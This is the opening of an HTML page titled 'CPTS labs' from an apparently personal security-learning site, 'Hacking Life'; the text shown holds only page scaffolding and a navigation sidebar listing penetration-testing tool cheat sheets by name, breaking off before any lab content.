
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="My personal knowledge repository">
      
      
        <meta name="author" content="amandaguglieri">
      
      
        <link rel="canonical" href="https://amandaguglieri.github.io/hackinglife/cpts-labs/">
      
      
        <link rel="prev" href="../cpts-cheat-sheet/">
      
      
        <link rel="next" href="../ejpt/">
      
      
      <link rel="icon" href="../img/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.50">
    
    
      
        <title>CPTS labs - Hacking Life</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.a40c8224.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      
  
  
    
    
  
  
  <style>:root{--md-admonition-icon--<type>:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V5h14m0-2H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2m-8 12h2v2h-2zm0-8h2v6h-2z"/></svg>');}</style>



    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300i,400,400i,700,700i%7CLato+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Lato";--md-code-font:"Lato Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../css/timeago.css">
    
      <link rel="stylesheet" href="../css/extra.css">
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#cpts-labs" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="Hacking Life" class="md-header__button md-logo" aria-label="Hacking Life" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 7v10h2v-4h2v4h2V7h-2v4h-2V7zM5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Hacking Life
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              CPTS labs
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="pink" data-md-color-accent="light-blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/amandaguglieri/hackinglife" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
  </div>
  <div class="md-source__repository">
    amandaguglieri/hackinglife
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="Hacking Life" class="md-nav__button md-logo" aria-label="Hacking Life" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 7v10h2v-4h2v4h2V7h-2v4h-2V7zM5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2"/></svg>

    </a>
    Hacking Life
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/amandaguglieri/hackinglife" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
  </div>
  <div class="md-source__repository">
    amandaguglieri/hackinglife
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
        
          
          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cheat sheets
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1">
            <span class="md-nav__icon md-icon"></span>
            Cheat sheets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../7z/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7z
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../activedirectory-powershell-module/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    active directory powershell module
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../android-debug-bridge/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ADB
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adidnsdump/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    adidnsdump
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../amass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    amass
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../apktool/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    apktool
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../aquatone/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    aquatone
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../arjun/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    arjun
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../arpspoof-dniff/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    arspoof- dniff
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../aws-cli/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    awscli
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-cli/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    azure CLI
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-powershell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    azure powershell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../bash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    bash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../bashfuscator/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    bashfuscator
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../beef/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    beef
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../bloodhound/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    bloodhound
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../braa/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    braa
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../burpsuite/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    burpsuite
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cewl/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    cewl
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cff-explorer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    cff explorer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../chisel/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    chisel
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cmd/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    cmd
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../crackmapexec/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    crackmapexec
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../crowbar/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    crowbar
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cupp-common-user-password-profiler/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    cupp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../curl/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    curl
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../acronyms/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    cyber acronyms
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ctr/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    crt.sh
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../crunch/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    crunch
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../darkarmour/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    darkarmour
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../default-creds/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    default creds
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../depix/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    depix
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dig/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dig
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dirb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dirb
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dnscan/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dnscan
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dnsenum/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dnsenum
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dnspy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dnspy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dnsrecon/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dnsrecon
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../docker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    docker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../domainpasswordspray/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DomainPasswordSpray
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dosfuscation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DOSfuscation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dotpeek/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dotpeek
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dread/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dread
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../drozer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    drozer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dsquery/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dsquery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../echo-mirage/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    echo mirage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../emacs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    emacs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../empire/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    empire
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../enum/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    enum
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../enum4linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    enum4linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../evil-winrm/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    evil-winrm
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../exiftool/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    exiftool
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../eyewitness/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    eyewitness
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../fatrat/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    fatRat
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../feroxbuster/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    feroxbuster
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../fierce/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    fierce
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../figlet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    figlet
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../finalrecon/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    finalrecon
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../fping/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    fping
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../frida/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    frida
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ffuf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ffuf
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../gcloud-cli/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    gcloudCLI
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../git/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    git
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../github-dorks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    github dorks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../gobuster/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    gobuster
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../gopherus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    gopherus
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../google-dorks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    google dorks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../grep/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    grep
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hashcat/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    hashcat
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../httprint/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    httprint
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../httrack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTTRack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hydra/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    hydra
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hugo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    hugo
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../i3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    i3
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../impacket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    impacket
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../inmunity-debugger/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    inmunity debugger
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../impacket-GetUserSPNs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    impacket GetUserSPNs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../impacket-ntlmrelayx/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    impacket ntlmrelayx
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../impacket-psexec/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    impacket psexec
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../impacket-secretsdump/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    impacket secretsdump
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../impacket-smbexec/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    impacket smbexec
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../interactsh/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    interactsh
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../inveigh/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    inveigh
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ipmitool/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ipmitool
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../jaws/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    jaws Just Another Windows Enumeration Script
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
